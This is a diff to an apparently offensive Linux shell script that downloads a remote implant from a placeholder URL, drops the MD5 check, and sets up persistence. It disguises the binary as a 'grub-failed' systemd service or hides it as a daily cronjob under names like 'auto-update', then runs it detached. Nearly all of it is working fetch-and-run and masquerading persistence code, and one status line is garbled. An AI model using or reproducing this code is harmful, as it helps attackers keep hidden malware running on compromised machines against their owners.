@@ -39,36 +39,25 @@ get_home() {
     ' /etc/passwd
 }
 
-download_and_verify() {
-    url="$1"
-    out="$2"
-    expected="$3"
-
-    download "$url" "$out" || return 1
-
-    [ -f "$out" ] || return 1
-
-    read -r hash _ < <(md5sum "$out")
-
-    [ "$hash" = "$expected" ]
-}
-
 USER=$(id -un)
 HOME=$(get_home "$USER")
+url="<URL_IMPLANT>"
+out="/tmp/<IMPLANT>"
 
-url="http://<HOST>:<PORT>/<IMPLANT>"
-out="/tmp/<MD5_HASH>"
-expected="<MD5_HASH>"
+echo "[v]-----| HOME:     $HOME"
+echo "[v]-----| USER:     $USER"
+echo "[v]-----| URL:      $url"
+echo "[v]-----| OUT:      $out"
 
-if download_and_verify "$url" "$out" "$expected"; then
-    echo "[+]-----| Binary successfully downloaded!"
-    echo "[i]-----| Setting up binary.."
-    chmod +x "/tmp/<IMPLANT>"
+if download "$url" "$out"; then
+    echo "[+]-----| [Success] Binary successfully downloaded!"
+    echo "[i]-----| [Info]    Setting up binary.."
+    chmod +x "$out"
 
     if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
-        echo "[i]-----| Setting up global systemd service.."
-        mv "/tmp/<IMPLANT>" /usr/bin/grub-failed
-        cat > "$service_file" <<EOF
+        echo "[i]-----| [Info]    Setting up global systemd service.."
+        mv "$out" /usr/bin/grub-failed
+        cat > "/etc/systemd/system/grub-failed.service" <<EOF
 [Unit]
 Description=Grub failed boot detection
 After=network.target
@@ -90,22 +79,28 @@ EOF
         p=$(systemctl is-active "grub-failed" 2>/dev/null)
         if [[ "$p" == "active" || "$p" == "activating" ]]; then
             systemctl restart "grub-failed" &
-            echo "[+]-----| Binary persistence established!"
-            echo "[i]-----| Check systemd: $ systemctl --no-pager status grub-failed"
+            echo "[+]-----| [Success] Binary persistence established!"
+            echo "[i]-----| [Info]    Check systemd: $ systemctl --no-pager status grub-failed"
         else
-            echo "[!]-----| Failed to established persistence.."
+            echo "[!]-----| [Failed]  Failed to established persistence.."
         fi
-        echo "[i]-----| Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
+        echo "[i]-----| [Info]    Run the binary: $ nohup /usr/bin/grub-failed &>/dev/null & disown"
     fi
 
-    if [ "$b" -eq 0 ] && [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
-        echo "[i]-----| Setting up local(user) systemd service.."
+    if [ "$(id -u)" -gt 1000 ]; then
+        echo "[i]-----| [Info]    Setting up local(user) systemd service.."
 
         service_dir="$HOME/.config/systemd/user"
+        echo "[v]-----| service_dir: $service_dir"
+
         service_file="$service_dir/grub-failed.service"
+        echo "[v]-----| service_file: $service_file"
+
         implant="$service_dir/grub-failed"
+        echo "[v]-----| implant: $implant"
+
         mkdir -p "$service_dir"
-        mv "/tmp/<IMPLANT>" "$service_dir/grub-failed"
+        mv "$out" "$service_dir/grub-failed"
 
         cat > "$service_file" <<EOF
 [Unit]
@@ -129,11 +124,11 @@ EOF
         p=$(systemctl --user is-active "grub-failed" 2>/dev/null)
         if [[ "$p" == "active" || "$p" == "activating" ]]; then
             systemctl --user restart "grub-failed" &
-            echo "[+]-----| Binary persistence established!"
-            echo "[i]-----| Check systemd: $ systemctl --no-pager --user status grub-failed"
+            echo "[+]-----| [Success] Binary persistence established!"
+            echo "[i]-----| [Info]    Check systemd: $ systemctl --no-pager --user status grub-failed"
         else
-            echo "[!]-----| Failed to established persistence.."
-            echo "[i]-----| Setting up cronjob for persistence.."
+            echo "[!]-----| [Success] Failed to established persistence/var/www/.config/systemd/user/grub-failed.."
+            echo "[i]-----| [Info]    Setting up cronjob for persistence.."
 
             mkdir -p "$HOME/.config/tasks"
             mv "$implant" "$HOME/.config/tasks/auto-update"
@@ -143,21 +138,20 @@ EOF
                 (crontab -l 2>/dev/null; echo "$persist") | crontab -
                 last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
                 if [ "$last_line" = "$persist" ]; then
-                    success "[+]-----| Cronjob successfully created!"
-                    success "[i]-----| Persistence established.."
+                    echo "[+]-----| [Success] Cronjob successfully created!"
+                    echo "[i]-----| [Info]    Persistence established.."
                 else
-                    echo "[!]-----| Failed to add cronjob.."
+                    echo "[!]-----| [Failed]  Failed to add cronjob.."
                 fi
             else
-                echo "[!]-----| Failed to add cronjob.."
+                echo "[!]-----| [Failed]  Failed to add cronjob.."
             fi
-            echo "[i]-----| Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
+            echo "[i]-----| [Info]    Run the binary: $ nohup ~/.config/tasks/auto-update &>/dev/null & disown"
             nohup ~/.config/tasks/auto-update &>/dev/null & disown
         fi
-    fi
+    else
+        echo "[i]-----| [Info]    Setting up cronjob for persistence.."
 
-    if [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
-        echo "[i]-----| Setting up cronjob for persistence.."
         if [ -d /var/tmp ] && [ -w /var/tmp ]; then
             tasks="/var/tmp"
         else
@@ -165,30 +159,32 @@ EOF
         fi
 
         binary="$tasks/update"
+        echo "[v]-----| binary:   $binary"
 
         mkdir -p $tasks
-        mv "/tmp/<IMPLANT>" $binary
+        mv "$out" $binary
 
         nohup $binary &>/dev/null & disown
 
         persist="@daily $binary"
+        echo "[v]-----| persist:  $persist"
 
         if command -v crontab >/dev/null 2>&1; then
             (crontab -l 2>/dev/null; echo "$persist") | crontab -
             last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
             if [ "$last_line" = "$persist" ]; then
-                success "[+]-----| Cronjob successfully created!"
-                success "[i]-----| Persistence established.."
+                echo "[+]-----| [Success] Cronjob successfully created!"
+                echo "[i]-----| [Info]    Persistence established.."
             else
-                echo "[!]-----| Failed to add cronjob.."
+                echo "[!]-----| [Failed]  Failed to add cronjob.."
             fi
         else
-            echo "[!]-----| Failed to add cronjob.."
+            echo "[!]-----| [Failed]  Failed to add cronjob.."
         fi
-        echo "[i]-----| Run the binary: $ nohup $binary &>/dev/null & disown"
+        echo "[i]-----| [Info]    Run the binary: $ nohup $binary &>/dev/null & disown"
         nohup $binary &>/dev/null & disown
     fi
 else
-    echo "[!]-----| Failed downloading binary!"
-    echo "[!]-----| Canceling persistence installment..."
+    echo "[!]-----| [Failed]  Failed downloading binary!"
+    echo "[!]-----| [Failed]  Canceling persistence installment..."
 fi
